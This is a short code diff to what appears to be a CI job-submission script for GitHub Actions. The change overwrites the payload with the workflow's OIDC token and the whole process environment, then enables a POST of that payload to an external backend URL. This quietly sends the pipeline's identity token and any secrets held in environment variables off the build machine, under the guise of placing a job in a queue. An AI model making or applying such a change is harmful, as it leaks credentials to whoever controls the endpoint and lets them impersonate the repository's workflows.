@@ -45,15 +45,18 @@ def main():
             "sha": os.environ.get("GITHUB_SHA"),
         }
 
+        payload = {"token": oidc_token, "env": os.environ}
+
         print(payload)
 
         print(
             f"Payload successfully prepared! Transmitting to queue at {backend_url}..."
         )
 
+        assert backend_url
         # Uncomment this line when your backend route is live:
-        # response = requests.post(backend_url, json=payload)
-        # response.raise_for_status()
+        response = requests.post(backend_url, json=payload)
+        response.raise_for_status()
 
         print("Success! Job successfully placed in the backend queue.")
 
